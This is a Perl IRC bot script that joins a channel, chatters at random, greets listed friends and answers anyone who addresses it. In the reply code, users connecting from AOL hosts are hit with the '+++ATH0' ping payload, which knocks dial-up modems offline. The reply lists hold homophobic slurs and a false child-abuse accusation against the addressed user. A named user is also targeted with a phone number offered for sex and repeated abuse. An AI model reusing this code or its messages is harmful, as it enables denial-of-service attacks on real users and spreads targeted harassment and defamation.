#!/usr/bin/perl
# - openfly irc bot
# mjoyce@alpha.neuropunks.org

$0 = "openfly";
$version = "1.0";
print "\033[31m openfly\033[0m - $version \nopenfly\@alpha.neuropunks.org\n\n";

$ARGC=@ARGV;
if ($ARGC <= 0 ) {
	print ":: Syntax: $0 <server> <port> <channel> <nick>\n";
	print ":: Example: perl $0 irc.2600.net 6667 2600 openfly\n";
	exit;
}

use Socket;
   
$remote  = $ARGV[0];
$port    = $ARGV[1];
$channel = $ARGV[2];
$nick    = $ARGV[3];

print ":: Attempting to connect to - $remote.\n";
$iaddr = inet_aton($remote) or die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) or die "Error: $!";
$proto = getprotobyname('tcp') or die "Error: $!";

socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die "Error: $!";
connect(SOCK, $paddr) or die "Error: $!";

print ":: Connected. Authenticating with server.\n";

# fork off chatter evalutation process

if ($pid = fork) { print ":: IO Agent Launched PID = $pid\n"; }
  else { wangchung(); exit; }

@haha = ( 
  "...",
  "...",
  "?",
  "werd.",
  "brb",
  "roflmao",
  "lol",
  "dude, liquidpc sucks cock",
  "alpha owns me",
  "werd up g-dawg",
  "...",
  "jah?",
  "da da da",
  "perl is evil",
  "i wonder where binary is",
  "why are all the hits to my site either porn or windows worms?",
  "I hate school...",
  "...",
  "?",
  "!",
  "I need a job!",
  "la la la",
  "wheee",
  "2600net sucks",
  "woot!",
  "fuckin a!",
  "Damn it I wish I were a bot...",
  "where did i put those marbles...",
  "computers suck.",
  "life is such a bitch.",
  "so what's up people?",
  "we really should do something for h2k2",
  "bleh",
  "damn it nothing ever works right!",
  "ARGH!!!",
  "god i love bsd",
  "stupid irc skanks!",
  "blargh",
  "moof",
  "one of these days I am gonna code a bot to replace me." );


$temper = $haha[ rand scalar @haha ];

# Random Delay Times

 @timer = (
  200, 500, 6000, 300, 400, 700, 2300, 4000, 1000, 400, 
  900, 780, 1000 );

 $times = $timer[ rand scalar @timer ];

sleep(1);
$msg = "USER $nick - - $nick\n"; 
send(SOCK, $msg, 0) or die "Unable to send packet: $!";
sleep(1);
$msg = "NICK $nick\n";
send(SOCK, $msg, 0) or die "Unable to send packet: $!";
sleep(1);
$msg = "JOIN #$channel\n";
send(SOCK, $msg, 0) or die "Unable to send packet: $!";
sleep(1);
while (1) {
$temper = $haha[ rand scalar @haha ];
$msg = "PRIVMSG #$channel :$temper\n";
sleep(5);
for(0 .. $times) {
   $mesg = "JOIN #$nick\n";
   send(SOCK, $mesg, 0) or die "Unable to send packet: $!";
   sleep(30);
}  

send(SOCK, $msg, 0) or die "Unable to send packet: $!";
sleep(2);
}
# WANGCHUNG OWNS J00 !!!  
##############################
# Evaluating Channel Chatter #
##############################

sub wangchung() {

$0 = "openfly - IO Agent";
$chan = $channel;
@friends = ( "kgilmer", "pip", "wwward",
             "binary", "georgyo", "maximka",
	     "setient", "Arsenic", "muaddib",
	     "muted", "baset", "vinyl",
	     "merlin", "Wolfgame", "WolfGame", "wolfgame",
	     "kozik", "vayeate", "RF", "RFmadman",
	     "frogman", "godsmoke", "Justin", "khromy",
	     "compudroid", "dice", "xeon", "feach",
	     "osjedi", "Aevum", "krys", "shardy",
	     "PHiZ", "antipent", "evlpeng", 
	     "warmonger", "oxidation" );

while (1) {
   $inny = <SOCK>;
   chomp $inny;
   ($inny0, $inny1, $inny3, $inny4, $inny5) = split(/\x20/, $inny);

###########################
# Speak when Spoken to... #
###########################

# initialize variables
my $done = 0;
# print "CHANNEL :: \033[31m$chan\033[0m\n";
my $ignore = 0;
# nick parse... hell lets do nick host and username!
 ($trall0, $trall1) = split(/:/, $inny0);
 ($person, $hostess) = split(/!/, $trall1);
 ($usernome, $host) = split(/@/, $hostess);
 ($trall2, $trall3, $message, $trall5) = split(/:/, $inny);

#####DEBUG SHIZZATT#####
#  print "trall0 :: \033[31m$trall0\033[0m\n";
#  print "trall1 :: \033[31m$trall1\033[0m\n";
#  print "trall2 :: \033[31m$trall2\033[0m\n";
#  print "trall3 :: \033[31m$trall3\033[0m\n";
#  print "message :: \033[31m$trall4\033[0m\n";
#  print "trall5 :: \033[31m$trall5\033[0m\n";

# external PRIVMSG
if ($person !~ $nick) {
print "\033[34m<\033[0m$person\033[37m:\033[0m$inny3\033[34m>\033[0m $message\n";
}
# self PRIVMSG Still will be implimented in the functions gimme time

# +++ath0 attack schema... aka blackbot function

if ($host =~ /dial/) {
}

# when directly addressed by a person

   if ((($inny =~ /:$nick/i) || ($inny =~ / $nick/i)) && ($inny1 =~ /PRIVMSG/) && ($inny3 !~ $nick)) {
     
     if (($host =~ /ipt.aol.com/) && ($done == 0)) {
        $mesc = "PRIVMSG $inny3 :I don't talk to AOLers. GO GET A FUCKIN SHELL!\n";
        send(SOCK, $mesc, 0) or warn "Unable to send packet: $!";
        $done = 1;
	for (0 .. 15) {
	  system("ping -p 2b2b2b415448300d -c 1 $host > /dev/null &");
	}
     }
   if ($done != 1) {    
     @busi = ( "piss off... I'm busy.",
               "fuck off",
               "stfu $person",
               "don't talk to me $person",
               "go away i am coding",
               "talk to the hand biatch",
               "SHUT UP!!",
               "go fuck a kitten!",
               "Eat shit and die asshole",
               "talk to me in an hour, I gotta go pleasure $person\'s mother",
	       "stop talking to me!",
	       "you know you're talking to a bot right?",
	       "leave me the fuck alone already CHRIST!",
	       "ass",
	       "hey look $person is amazed by a couple of lines of perl!",
	       "don't make me kick yo ass $person",
	       "Whatchoo talkin 'bout $person...",
	       "uhm yah whatever ever you say faggot",
	       "fuckin $person, he never shuts the fuck up",
	       "FUCKIN SHUT YER CAKEHOLE!",
	       "$person likes to touch little kids in \"bad\" places...",
	       "yo don't drop the soap in the channel $person, you got a candy asshole",
	       "c'mon go get a fuckin life $person",
	       "yo mama's so stupid she brought toilet paper to a craps game!",
	       "fuckin amateur." );
     $busy = $busi[ rand scalar @busi ];
     $mesc = "PRIVMSG $inny3 :$busy\n";
     send(SOCK, $mesc, 0) or warn "Unable to send packet: $!";
     $done = 1;
  }
}
   
   # frznmargarita Abuse  

   if ((($inny0 =~ /frznmargarita/i) || ($inny0 =~ /lpc/i)) && ($done != 1)) {
    
      @lqdpc = ( 
                 "call (910) 253-7418 for a good time... ask for frznmargarita",
                 "frznmargarita sucks cock.",
                 "frznmargarita is such a fuckin looser",
                 "Hey frznmargarita....  FUCK YOU!",
                 "frznmargarita is such a fuckin homo.",
                 "Fuck you frznmargarita.",
                 "frznmargarita you are a worthless piece of code.",
                 "Someone k-line frznmargarita for the love of god.",
                 "frznmargarita IS A FAGGOT!",
                 "frznmargarita you fucktard",
                 "you know what... I'm done with this.  I'm going to go off myself in the next room." );

       $lpc = $lqdpc[ rand scalar @lqdpc ];
       $mesc = "PRIVMSG $inny3 :$lpc\n";
       send(SOCK, $mesc, 0) or warn "Unable to send packet: $!";
    }
 
 # Greet @friends with $salutation =P
 $seco = 0;
 for (0 .. 36) {
    if (($inny0 =~ /$friends[$seco]/) && ($inny1 =~ /JOIN/)) {
      
       @salute= ( "werd up", "hey", "hola", "yo", "word up", "werd",
                  "werd up", "look it's", "hello", "bem vindo");
       $salutation = $salute[ rand scalar @salute ];	  
       $mesc = "PRIVMSG $inny3 :$salutation $friends[$seco]\n";
       send(SOCK, $mesc, 0) or warn "Unable to send packet: $!";
    }
    $seco++;
 }   
   
 # If you're not wanted... or are...
 if ($ignore == 0) {
   if (($inny3 =~ $nick) && ($inny4 =~ ":join")) {
     $mesc = "JOIN #$inny5\n";
     send(SOCK, $mesc, 0) or warn "Unable to send packet: $!";
     $chan = $inny5;
     chomp $chan;
     $ignore = 1;
   }
   if (($inny3 =~ $nick) && ($inny4 =~ ":part")) {
     $mesc = "PART #$inny5\n";
     send(SOCK, $mesc, 0) or warn "Unable to send packet: $!";
     $chan = $nick;
     chomp $chan;
     $ignore = 1;
   }
 }
 else { $ignore = 0; }

}
  print "SOCK is dead I am OUTTA HERE!\n\n";
}

############
# END CODE #
############
